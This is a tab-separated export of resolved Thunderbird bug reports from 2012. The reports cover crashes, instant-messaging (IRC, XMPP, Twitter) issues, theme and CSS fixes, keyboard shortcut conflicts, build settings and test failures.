802459%TAB%1350407093%TAB%8636%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%FileLink%TAB%OOM crash if attaching too large file for filelink%TAB%OOM crash if attaching too large file for filelinkI have fixed Gecko side by bug 801483 if nsIBufferedInputStream.init(<too large size) causes OOM crashes (ex. bp-f7294fd5-e5d4-4c5f-81ea-86b722121012).  So init(<too large size>) in Gecko 19 will throw NS_ERROR_OUT_OF_MEMORY instead of crash.  But, buffer length parameter of init should not use file size because this is buffer size for seeking.  the following code is incorrect usages of nsIBufferedInputStream.  /mail/components/cloudfile/nsUbuntuOne.js (View Hg log or Hg annotations)     line 692 -- createInstance(Ci.nsIBufferedInputStream); /mail/components/cloudfile/nsYouSendIt.js (View Hg log or Hg annotations)     line 1074 -- .createInstance(Ci.nsIBufferedInputStream); /mail/components/cloudfile/nsBox.js (View Hg log or Hg annotations)     line 857 -- .createInstance(Ci.nsIBufferedInputStream);
801582%TAB%1350266093%TAB%279379%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%Line length in the new IRC chat module not restricted or restrictable by option%TAB%Line length in the new IRC chat module not restricted or restrictable by optionUser Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0 Build ID: 20121010223843  Steps to reproduce:  Typed a line in IRC which was to long for the IRC protocol   Actual results:  The line was cut after 512 characters as described in the IRC specification   Expected results:  A. The input box should not allow more than 512 characters  OR (better)  B. Thunderbird should cut the text in several 512 long lines to meet the IRC specification.  PS: A warning dialog for too long overall text (for example a message who would create more then 10 irc lines) should appear, would be also nice to have, in case of clipboard accidents.
801261%TAB%1350085313%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Adopt editContactOverlay to new light coloring%TAB%Adopt editContactOverlay to new light coloringBug 771284 changed the way arrow panels look (dark --> light). We should adjust the css for our editContactOverlay to look similar.
800525%TAB%1349955621%TAB%405323%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%wrapped nick causes extra height on secondary lines%TAB%wrapped nick causes extra height on secondary linesWhen a user's nick wraps, that message line becomes double-height (to display the nick).  However, when the nick is hidden (because it's a subsequent message from the same user), that extra height is still used.  The attached patch switches it from visibility:hidden to display:none to avoid this.
800123%TAB%1349869294%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Address Book%TAB%Don't hard code the contact photos in cardDialog%TAB%Don't hard code the contact photos in cardDialogThe default Contact photos in cardDialog are hard coded in XUL and JS. This makes it impossible to add HiDPI images for Retina Macs and themers have to follow this name and path to show the images.
800091%TAB%1349864975%TAB%97012%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Filters,Filters%TAB%Filter list no longer finds and selects filter using keyboard entry.,in filter list dialog, indicate when a search on the filter names is applied and when there are no hits.%TAB%Filter list no longer finds and selects filter using keyboard entry.,in filter list dialog, indicate when a search on the filter names is applied and when there are no hits.+++ This bug was initially created as a clone of Bug #543239 comment 6 +++  Blake Winton (:bwinton - Thunderbird UX) 2012-10-10 21:07:53 CEST   I like it, although I would like it a little more if we could indicate when a filter search failed, perhaps with a red outline around the search box, or by showing nothing in the filter list?
799596%TAB%1349774421%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Thunderbird is unusable after bug 565717 landed%TAB%Thunderbird is unusable after bug 565717 landedToolkit changed a string ID on us, which has rendered TB completely busted.  Specifically, we need to change spellCheckEnable.* to spellCheckToggle.*.
799504%TAB%1349762380%TAB%453291%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Long retweets are cut off after 140 characters%TAB%Long retweets are cut off after 140 charactersUser Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1 Build ID: 20120907231657  Steps to reproduce:  For Twitter, Thunderbird truncates tweets after 140 characters, even if the tweet is longer than 140 characters when "RT @username" is appended.   Actual results:  Retweets that were created using Twitter's web interface do not count the "RT @username" portion within the 140 character limit.  Consequently, it is common to have retweets that exceed 140 characters when "RT @username" is added.  This is especially problematic when the tweet ends in a link, which is then truncated to e.g. "http:/" or "http://t.co/".   Expected results:  Thunderbird should display the whole tweet, and not truncate tweets after 140 characters.
799451%TAB%1349750418%TAB%160105%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Can't remove attachment with keyboard in forwarded e-mail%TAB%Can't remove attachment with keyboard in forwarded e-mailSometimes I need to forward e-mails (inline), but I have to strip the attachment. So I select the message, press Ctrl+L to forward the message. Then in the Compose window I press Alt+M to go to the attachments bucket, press Space to select the attachment and press Del to delete it, but nothing happens.  I can delete the attachment by going to the menu Edit -> Remove attachment (Del).  I see the following error in the Error Console: Timestamp: 9-10-2012 13:35:47 Error: TypeError: boundTarget is null Source File: chrome://messenger/content/messengercompose/MsgComposeCommands.js Line: 4175  It doesn't matter whether I'm in safe-mode or not.
799434%TAB%1349744387%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Earlybird builds shouldn't have profiling enabled%TAB%Earlybird builds shouldn't have profiling enabledIt was never intended to have profiling on Earlybird builds, this was missed in the last merge, we should remove --enable-profiling from the aurora mozconfigs.  I'm not going to do this until bug 799295 is fixed though, as there may be a crash issue lurking with profiling disabled.
799068%TAB%1349659972%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Land in comm-central Instantbird's changes to chat/ - 3%TAB%Land in comm-central Instantbird's changes to chat/ - 3+++ This bug was initially created as a clone of Bug #776901 +++  There are lots of changesets touching the chat/ shared folder that have landed in hg.instantbird.org/instantbird and not comm-central since the previous sync in bug 776901.
798952%TAB%1349602498%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Move sanitizeDialog.css to mail subdirectory%TAB%Move sanitizeDialog.css to mail subdirectorysanitizeDialog.css is in the root theme directory. For consistency it should be in mail subdirectory like all other files.
795989%TAB%1349079949%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%cleanup of folderpane icons%TAB%cleanup of folderpane iconsQute and Gnomestripe themes make use of imagemaps for the folderpane icons. This requires less amount of files and also helps with performance slightly. By doing this to pinstripe too, the code will be easier to read due to being more homogeneous between the different themes.
795983%TAB%1349079402%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Chrome file doesn't exist: [...]/chrome/messenger/skin/classic/messenger/messages/Variants/Normal.css%TAB%Chrome file doesn't exist: [...]/chrome/messenger/skin/classic/messenger/messages/Variants/Normal.css[...]/chrome/messenger/skin/classic/messenger/messages/Variants/Normal.css  Bug 768919 changed the message theme used in Thunderbird by default and added (unintentionally I think) these 2 lines in Info.plist: http://hg.mozilla.org/comm-central/rev/7af51ca03270#l5.36      5.36 +  <key>DefaultVariant</key>     5.37 +  <string>Normal</string>  This causes the message theme system to attempt to include a Normal.css file that doesn't exist.  
795971%TAB%1349078934%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%JavaScript strict warning: logger.js, line 453: assignment to undeclared variable entry%TAB%JavaScript strict warning: logger.js, line 453: assignment to undeclared variable entryJavaScript strict warning: file:///Users/florian/buildhg/comm-central/obj-tbird-dbg/mozilla/dist/DailyDebug.app/Contents/MacOS/components/logger.js, line 453: assignment to undeclared variable entry  http://hg.mozilla.org/comm-central/annotate/3cb6fce9232d/chat/components/src/logger.js#l453
795959%TAB%1349078029%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Typing "@gmail.com" as part of the username shouldn't be required when setting up a gtalk account%TAB%Typing "@gmail.com" as part of the username shouldn't be required when setting up a gtalk accountGuessing if the domain is @gmail.com or @googlemail.com is possible if we implement a Google specific XMPP extension documented at https://developers.google.com/talk/jep_extensions/jid_domain_change  I think we should do it to avoid some confusion.
795296%TAB%1348806181%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Include the string that couldn't be parsed in XML parse errors of the XMPP stream%TAB%Include the string that couldn't be parsed in XML parse errors of the XMPP streamWe need this to understand what's going on in bug 775977.  The error messages we currently have when the XML parser doesn't like something we received on the XMPP stream are useless.
795152%TAB%1348752124%TAB%258347%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Switch to Services.jsm: What's left%TAB%Switch to Services.jsm: What's leftUsing Services.jsm will clean up the readability of our code a bit, and should avoid the costs the getService call each time we want a service.  For compose code, see bug 794909.  A few tests are failing, if you are familiar with these, please investigate this.
795078%TAB%1348743398%TAB%260719%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Thunderbird does not see user online and can't receive message from a contact with a singe quote in its resource%TAB%Thunderbird does not see user online and can't receive message from a contact with a singe quote in its resourceIf a remote contact has a single quote (') in their XMPP resource, Thunderbird's Instant Messaging client will never see it online. If the contact messages the user using Thunderbird, no message will be received.  If the remote user removes the single quote from its resource, it will show as online in Thunderbird's contact list as expected and Thunderbird will receive messages from the remote user.
794988%TAB%1348730447%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Enable profiling on Daily builds%TAB%Enable profiling on Daily buildsAccording to https://developer.mozilla.org/en-US/docs/Performance/Profiling_with_the_Built-in_Profiler#Running_the_profiler, we just need to add:  ac_add_options --enable-profiling  to the .mozconfigs for our Daily's.
794946%TAB%1348726213%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Instant Messaging%TAB%Add mozmill tests for the instant messaging UI,Add mozmill tests for the chat toolbar and the central placeholder of the instant messaging UI%TAB%Add mozmill tests for the instant messaging UI,Add mozmill tests for the chat toolbar and the central placeholder of the instant messaging UII started by testing that the chat tab can be opened, that the buttons of the chat toolbar are correctly disabled/enabled, and that the place holder in the middle of the chat tab is correct.  Attaching the WIP to get some feedback before I write more mozmill tests.
794909%TAB%1348721259%TAB%258347%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Switch to Services.jsm: compose code%TAB%Switch to Services.jsm: compose codeUsing Services.jsm will clean up the readability of our code a bit, and should avoid the costs the getService call each time we want a service.  https://developer.mozilla.org/en-US/docs/JavaScript_code_modules/Services.jsm
794880%TAB%1348711290%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%[Mac] The icon of the "Add Contact" and "Join Chat" toolbar buttons disappear when they are clicked while disabled%TAB%[Mac] The icon of the "Add Contact" and "Join Chat" toolbar buttons disappear when they are clicked while disabledThis is a regression from bug 709799.  The CSS code in http://hg.mozilla.org/comm-central/annotate/f909272fc02a/mail/themes/pinstripe/mail/chat.css#l101 looks like this:    101 #button-join-chat {    102   list-style-image: url("chrome://messenger/skin/icons/chat-toolbar.png");    103   -moz-image-region: rect(0px 36px 18px 18px);    104 }    105     106 #button-join-chat:hover:active {    107   list-style-image: url("chrome://messenger/skin/icons/chat-toolbar.png");    108   -moz-image-region: rect(32px 64px 64px 32px);    109 }    110     111 #button-join-chat:not([disabled="true"]):active {    112   list-style-image: url("chrome://messenger/skin/icons/chat-toolbar.png");    113   -moz-image-region: rect(18px 36px 36px 18px);    114 }  I think the problem is that the second rule is applied even when the button is disabled.  Also, not that the lines 107 and 112 are pointless duplication here (and this duplication also exists for the Windows and Linux themes).
794739%TAB%1348692886%TAB%97012%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%Check Now button to make Thunderbird the default mail/news/rss application does nothing%TAB%Check Now button to make Thunderbird the default mail/news/rss application does nothing+++ This bug was initially created as a clone of Bug #262362 comment 8+++  For me on Linux and KDE3 the "Check now" button in preferences->Advanced->General is shown but does nothing. No message in the Rrror console. From looking at the code the button is wrapped inside #ifdef HAVE_SHELL_SERVICE but that seems to be set for linux-gtk2 globally. I have it set but getting the shell-service throws and exception. The code hides the exception and exits cleanly. I have gconf installed but maybe it does not work.  I think the buttons should not be exposed if we can know if it will work, via checking the shell-service. This patch hides the button and the checkbox, because also the "search intergration" checkbox in the same groupbox is hidden on unsupported systems. Or is it better to just disable it?  My take would be it's better to disable. Otherwise someone knowing where it is would be looking all over the place in vain. Also, because it should be possible to make it work by installing whatever packages are needed.
793888%TAB%1348494702%TAB%26835%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI,Theme%TAB%Separators in the message header pane toolbar are not visible, separator and space cannot be removed again from the header pane toolbar%TAB%Separators in the message header pane toolbar are not visible, separator and space cannot be removed again from the header pane toolbarSince between version 10.0.2 and 11.0.1 separators in the header pane toolbar have not been visible anymore.   If you add a separator to the header pane toolbar (by using the customization drop down menu over the toolbar), the separator is not visible in the toolbar and it can't be removed anymore (other then by selecting default set). Instead an empty space is added to the toolbar.  Actually, (nearly) the same applies to the "space" button: After adding it to the header pane toolbar it cannot be removed anymore.  It worked with version 10.0.2 and does not work with 11.0.1. The problem still exists in the trunk.
793838%TAB%1348487565%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Feed body AppMenu items are not working anymore%TAB%Feed body AppMenu items are not working anymoreBug 596234 changed on main menu items the oncommand from ChangeFeedShowSummaryPref() to FeedMessageHandler.onSelectPref = but forgot the AppMenu items. The AppMenu items are also not showing the checked mode.  This patch fixes the issues. But when I change the view with the AppMenu items the checked state on main menu isn't updated when this isn't opened before I change the view. It looks like the main menu items aren't initialized correctly.
793749%TAB%1348473081%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%FileLink%TAB%Add support for the PLAINTEXT signature method to oauth.jsm%TAB%Add support for the PLAINTEXT signature method to oauth.jsmThe PLAINTEXT OAuth signature method is required to add Spideroak support for Filelink, and is also needed to fix bug 764312 (sending files with a name containing the '(' or ')' characters through Ubuntu One).  A patch for this has been developed and reviewed in bug 744035 for Spideroak, but it would be useful for Ubuntu One to land this before the Spideroak support is finished, so I'm splitting this out to a separate bug per Mark's request.
793643%TAB%1348451967%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Upgrade clang to r161152%TAB%Upgrade clang to r161152+++ This bug was initially created as a clone of Bug #787568 +++  We should upgrade to clang r161152 to match Firefox, additionally we should add in a check-sync-dirs check that our .manifest files match Firefox, and hence we'll automatically be notified if we miss a change that Firefox is doing (if we really desire to not be in sync for a period, then we can always turn it off or exclude files, but generally best to keep up to date).  I've tested the builds on try server:  Full build and test, but with broken check-sync-dirs test: https://tbpl.mozilla.org/?tree=Thunderbird-Try&rev=3adc167fc287  Full build, following the fixing of the check sync-dirs test: https://tbpl.mozilla.org/?tree=Thunderbird-Try&rev=db0aa75d073e
793265%TAB%1348221080%TAB%7044%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Visual glitch on the left and right side of the Thunderbird tab bar on Aero%TAB%Visual glitch on the left and right side of the Thunderbird tab bar on AeroUsing Thunderbird 15.0.1 on Win7 with Aero: the tab bar has a vertical gradient that shades the aero glass; this extends all the way to the left and right edge of the window. This means that the edge of the window doesn't blend in with the glass border of the window. I think that the left and right edge should have a radial gradient edge which extends full glass to the corner.
792965%TAB%1348138630%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Add icons to compose autocomplete list%TAB%Add icons to compose autocomplete listThe address autocomplete list lacks icons on Linux/Windows. OSX has the icons.  I haven't took the treechildren::-moz-tree-cell-text(default-match) rule the OSX theme is using because I'm seeing no difference with or without this. I also don't know when this is used.
792793%TAB%1348106993%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%OS Integration%TAB%Remove growl support from comm-central%TAB%Remove growl support from comm-centralBug 777409 removed growl support, and the comm-central tree is currently busted: mailnews/base/src/nsMessengerOSXIntegration.mm:40:10: fatal error: 'nsINotificationsList.h' file not found make[8]: *** [nsMessengerOSXIntegration.o] Error 1  The attached patch removes Growl specific code from mailnews, but keeps the call to nsIAlertsService, as that will use the new notification center on 10.8.
792392%TAB%1348028398%TAB%434096%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Folder and Message Lists%TAB%No special icon for secure connection in folder pane,No special icon for secure connection in folder pane on linux%TAB%No special icon for secure connection in folder pane,No special icon for secure connection in folder pane on linuxI've set up an IMAP/SSL connection. This should result in a "secure connection" icon in the folder pane (like in the first attachment, screenshot by Ludovic Hirlimann), but doesn't (see second attachment)  TB 17.0a2 running on RHEL5/x86-64  Mozilla/5.0 (X11; Linux i686 on x86_64; rv:17.0) Gecko/17.0 Thunderbird/17.0a2 ID:20120918042014
792105%TAB%1347957140%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Testing Infrastructure%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-content-tab.js | test-content-tab.js::test_content_tab_open | test-content-tab.js::test_content_tab_default_favicon%TAB%Permanent orange: TEST-UNEXPECTED-FAIL | test-content-tab.js | test-content-tab.js::test_content_tab_open | test-content-tab.js::test_content_tab_default_faviconThese just showed up on our Linux builders. Not sure if they affect Windows / OSX right now due to our tree being in flames on those platforms.  Test Failure: The tab [undefined undefined] should have a favicon with URL http://localhost:43336/whatsnew.png but instead has null TEST-UNEXPECTED-FAIL | /home/cltbld/talos-slave/test/build/mozmill/content-tabs/test-content-tab.js | test-content-tab.js::test_content_tab_open  Test Failure: The tab [undefined undefined] should have a favicon with URL http://localhost:43336/favicon.ico but instead has null TEST-UNEXPECTED-FAIL | /home/cltbld/talos-slave/test/build/mozmill/content-tabs/test-content-tab.js | test-content-tab.js::test_content_tab_default_favicon
792074%TAB%1347951664%TAB%278074%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Earlybird's idisplayed keyboard shortcut for Chat, Ctrl+Shift+C, doesn't work,Earlybird's displayed keyboard shortcut for Chat (Ctrl+Shift+C) has no effect%TAB%Earlybird's idisplayed keyboard shortcut for Chat, Ctrl+Shift+C, doesn't work,Earlybird's displayed keyboard shortcut for Chat (Ctrl+Shift+C) has no effectSTR:  1. Start thunderbird (fresh profile if you like; dismiss the new-account dialog)   2. Inspect the "Go" menu -- see what the command is for "Chat".      (I have to hit Alt+g to make the menu appear, and the command displayed       for "Chat" is Ctrl+Shift+C)   3. Press the Chat command (Ctrl+Shift+C for me on Linux)  ACTUAL RESULTS: Nothing happens. EXPECTED RESULTS: Should open the chat window, as if you'd activated that menu item with the mouse.  I've tested this on release (15.01) and earlybird (17.0a2), and it affects both.  Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/17.0 Thunderbird/17.0a2 Build ID: 20120918042014 (latest Earlybird) OS: Ubuntu 12.10 beta  Perhaps there's a conflict on that keybinding?
792046%TAB%1347947148%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Improve the error message when failing to connect an XMPP/IRC account because of a broken certificate%TAB%Improve the error message when failing to connect an XMPP/IRC account because of a broken certificateWe have received lots of confusing support requests for IM in Tb because when we fail to connect to an XMPP or IRC server that has a broken (or self-signed, or not satisfying NSS' requirements for any reason) certificate, we currently just display a generic and not really appropriate "The server closed the connection" error message.  The attached patch replaces this error message with an error message coming from NSS (so we don't need new localizable strings! :-)) for cases of invalid certificates.  (Note: the patch removes a string from chat/locales/en-US/irc.properties that wasn't used anyway. If the patch lands on aurora, I won't include that change there.)
791957%TAB%1347925434%TAB%377777%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General%TAB%New menu doesn't list access key next to menu item,New app menu doesn't list keyboard shortcuts next to menu items%TAB%New menu doesn't list access key next to menu item,New app menu doesn't list keyboard shortcuts next to menu itemsNew menu doesn't list access key next to menu item. They are only listed in old menu which is now hidden.  New users will have hard time finding out which access key is for what if he/she doesn't discover old menu.
791542%TAB%1347763997%TAB%198415%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%[TB17 test] IM account troubleshoting information are erronous,[TB17 test] IM account troubleshooting information is erroneous%TAB%[TB17 test] IM account troubleshoting information are erronous,[TB17 test] IM account troubleshooting information is erroneous1/ Set-up a chat account (IRC or Google for instance) 2/ Display the troubleshoting informations 3/ Server name is not displayed : (im) realHostName FIXME:0  This was working good in TB15.
791311%TAB%1347613440%TAB%254728%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Mail Window Front End%TAB%Dont disable the menubar for existing users%TAB%Dont disable the menubar for existing usersSince bug 650170, existing users will suddenly find that there menubar has disappeared, which will lead to a lot of dissatisfaction.  I think that we should detect somehow that we are dealing with an existing user, and leave the menubar enabled for them. For new profiles we could still leave it disabled.
789745%TAB%1347106519%TAB%301380%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Cannot connect to XMPP account,Cannot connect to XMPP servers that don't support SASL authentication%TAB%Cannot connect to XMPP account,Cannot connect to XMPP servers that don't support SASL authenticationUser Agent: Mozilla/5.0 (Windows NT 6.0; rv:15.0) Gecko/20100101 Firefox/15.0.1 Build ID: 20120905151427  Steps to reproduce:  1. Set up a new XMPP account in Thunderbird. 1.a. Use the format username@domain for the username. 1.b. Leave XMPP Options on default settings. 1.c. Uncheck "Connect this account now." 2. Open the "Instant messaging status" window via Tools > Chat Status > Show Accounts... (or any other valid method). 3. Select the desired account. 4. Click the "Connect" button.     Actual results:  The status changes to "Connecting", followed shortly by "Connecting: Initializing stream..." that never seems to time out (left it open for at least 20 minutes).  Nothing is reported in the Error Console.   Expected results:  Thunderbird should connect to the chat account if connection is possible.  If connection is not possible, Thunderbird should produce useful and visible errors to the user to indicate a problem.   I do not have any proxies configured, so this shouldn't be related to bug 741536.  This is not a secure XMPP connection, so it shouldn't be bug 780749 or other related Self-Signed Certificate bugs.  I thought it might be a possible domain name mismatch between the username and the server (this is on shared web hosting), but even when I tried to adjust the settings for that, it would exhibit the same behavior described earlier.  Using the same account settings, I can connect to the account with: - Digsby - Build 30295 - Psi v0.14 - Pidgin 2.10.6 (libpurple 2.10.6) - Instantbird version 1.2 (20120806152218)   - Gecko 14.0.1 (20120806152218)   - libpurple 2.10.4
788259%TAB%1346757779%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Plugin check pref set to mozilla.com instead of mozilla.org causing a useless redirect and making it vulnerable to improper redirects in mozilla.com%TAB%Plugin check pref set to mozilla.com instead of mozilla.org causing a useless redirect and making it vulnerable to improper redirects in mozilla.com+++ This bug was initially created as a clone of Bug #752161 +++  When I click the addon manager's link to the plugin check website, I end up at https://www.mozilla.com/en/404 (which for whatever reason is using the Student Reps theme).  That seems wrong.   The link from about:plugins works, for whatever that's worth.  I'm using the latest Nightly build as of mid-day Friday.  In about:config, "plugins.update.url" is set to the default "https://www.mozilla.com/%LOCALE%/plugincheck/". (Which, when I replace %LOCALE% with "en-US", leads me to that same 404 error page.)
787794%TAB%1346560930%TAB%97012%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%fix JS strict mode warnings that appear at Thunderbird startup,fix some JS strict mode warnings that appear at Thunderbird startup%TAB%fix JS strict mode warnings that appear at Thunderbird startup,fix some JS strict mode warnings that appear at Thunderbird startupWarning: SyntaxError: in strict mode code, functions may be declared only at top level or immediately within another function Source file: chrome://messenger/content/mail3PaneWindowCommands.js Line: 511, Column: 17 Source code:         function canCompact(folder) {   or  Warning: ReferenceError: reference to undefined property node.id Source file: chrome://messenger/content/folderWidgets.xml Line: 23  I try to fix some of them, to ease spotting new warnings by developers when creating new code. I fix only those produced by comm-central code and only those that I understand how to fix :)
787640%TAB%1346458711%TAB%258347%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%XMPP: Account wizard and account settings window dimension too small, input fields cut off/cropped, port input hidden%TAB%XMPP: Account wizard and account settings window dimension too small, input fields cut off/cropped, port input hiddenMozilla/5.0 (Windows NT 5.1; rv:16.0) Gecko/20120828 Thunderbird/16.0  Chat: Account wizard and account settings window dimension too small, input fields cut off/cropped, port input hidden. See the attached screenshots for the problem with the German Thunderbird.  Account wizard: Extending the XMPP options even causes scrollbars in the English Thunderbird 15.0  Account settings: We (German localizers) need the encryption input on a new line so it doesn't get cut off.
787433%TAB%1346394097%TAB%354736%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%IRC component should return a proper CTCP VERSION response.%TAB%IRC component should return a proper CTCP VERSION response.User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:15.0) Gecko/20100101 Firefox/15.0 Build ID: 20120824154833  Steps to reproduce:  Connected to an IRC server with Thunderbrid, and check the Thunderbird's response to a CTCP VERSION request.   Actual results:  Only returned the string "Thunderbird".   Expected results:  According to the IRC's RFC (http://www.irchelp.org/irchelp/rfc/) the client should return the client name and the version.  Sometimes bugs appear in the clients and Network Administrators must get rid of that buggy clients in order to ensure security of the Network users. One of the best "weapons" to detect the buggy versions is CTCP VERSION. If Thunderbird returns only the name of the client a bug on the client can result into a ban to all versions of the client.  I think that should be convenient to add the version number. At least that's my suggestion as a Network Administrator and as a future user of Thunderbird client that I found useful to have it at work.
787149%TAB%1346318666%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Instant Messaging%TAB%Change log tree to list the days that logs exist, and then show all logs for that day when selected%TAB%Change log tree to list the days that logs exist, and then show all logs for that day when selectedCurrently, the IM log tree lists each individual log file for a particular conversation. This is stratified in the "Today", "Yesterday", "Last Week", "Two Weeks Ago", and "X - Y" twisty tree nodes.  In the product council today, Jb requested that instead of this, we don't make "Today" a twisty - rather, when we click on "Today", we simply get every log for this conversation for today, concatenated in the log viewer.  We'd have a similar behaviour when clicking "Yesterday".  "Last Week" would be a twisty with the individual days with logs listed underneath it. Same with "Two Weeks Ago" and "X - Y".
787046%TAB%1346301614%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%"Not authorized" error when connecting to an OpenFire XMPP server with the correct password.%TAB%"Not authorized" error when connecting to an OpenFire XMPP server with the correct password.Paul sent me a log of a failed connection attempt to an OpenFire server (thanks!).  The auth sequence looks like this: Client: <auth xmlns="urn:ietf:params:xml:ns:xmpp-sasl" mechanism="DIGEST-MD5"/> Server: <challenge xmlns="urn:ietf:params:xml:ns:xmpp-sasl">[...]</challenge> Client: <response xmlns="urn:ietf:params:xml:ns:xmpp-sasl">[...]</response> Server: <success xmlns="urn:ietf:params:xml:ns:xmpp-sasl">[b64 encoded value containing: rspauth=<hex number>]</success> At this point, Thunderbird marks the account as disconnected with "Not authorized" as the error.  The XMPP spec has an example of the expected exchange at: http://xmpp.org/rfcs/rfc3920.html#rfc.section.6.5  Instead of replying "<success ..." the server is expected to reply: <challenge xmlns='urn:ietf:params:xml:ns:xmpp-sasl'> [b64 encoded value containing: rspauth=<hex number>] </challenge> And then the exchange finishes with: Client: <response xmlns='urn:ietf:params:xml:ns:xmpp-sasl'/> Server: <success xmlns='urn:ietf:params:xml:ns:xmpp-sasl'/>
786684%TAB%1346220882%TAB%367157%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Tbird 15 won't connect to an xmpp server,JS error (TypeError: match[1] is undefined) when parsing a JID without a node part.%TAB%Tbird 15 won't connect to an xmpp server,JS error (TypeError: match[1] is undefined) when parsing a JID without a node part.When I try to connect to the xmpp server talk37.ru, Thunderbird won't connect to the server with the following error: Timestamp: 8/29/2012 17:33:26 Error: NS_ERROR_XPC_JS_THREW_JS_OBJECT: 'TypeError: match[1] is undefined' when calling method: [prplIAccount::connect] Source File: resource:///components/imAccounts.js Line: 620
786606%TAB%1346203748%TAB%109976%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Instant Messaging%TAB%Chat shortcut key Ctrl+Shift+C doesn't do anything,Chat shortcut key Ctrl+Shift+C doesn't do anything - conflicts with keyboard shortcut for Lightning's Calendar tab%TAB%Chat shortcut key Ctrl+Shift+C doesn't do anything,Chat shortcut key Ctrl+Shift+C doesn't do anything - conflicts with keyboard shortcut for Lightning's Calendar tabThere is a shortcut key Ctrl+Shift+C displayed for the Go / Chat menu. Pressing that key doesn't do anything however. Looking at http://hg.mozilla.org/comm-central/file/b849a17c4bc1/mail/base/content/mailWindowOverlay.xul#l404 - the key doesn't have any command assigned. It seems that there is oncommand="showChatTab();" missing here.  Hmmm, according to https://support.mozillamessaging.com/en-US/kb/keyboard-shortcuts, Ctrl+Shift+C is reserved for opening and switching to Lightning's Calendar tab, and it also works that way on my tb15/winxp.  Why do we maintain a keyboard shortcuts list if nobody even bothers to look at it before grabbing new shortcuts? And why was the bug that wanted to add the chat shortcut not added to the keyboard shortcut trackers? Bug 713979 tb-keyboard-tracker (for pending changes or broken keyboard shortcuts) Bug 714031 tbkbd-doc-tracker (for tracking in documentation)
786404%TAB%1346148681%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Twitter stops downloading tweets until user goes Offline and then back Online%TAB%Twitter stops downloading tweets until user goes Offline and then back OnlineFrom a user over Twitter:  "I use Chat for Twitter and it stops responding refreshing tweets. I have to go Online/Offline to 'refresh'. >_<"  I feel it has something to do with the network instability. In order to reproduce this, maybe you should give some reset|time out error to TB. And I doubt bug 787670 is really a duplicate: the point of bug 787670 is dropping tweets. Whatever makes TB stop refreshing, when TB get connected to twitter.com, it should begin pulling tweets from the last retrieved tweet, not from the last trying to retrieve (just guess).
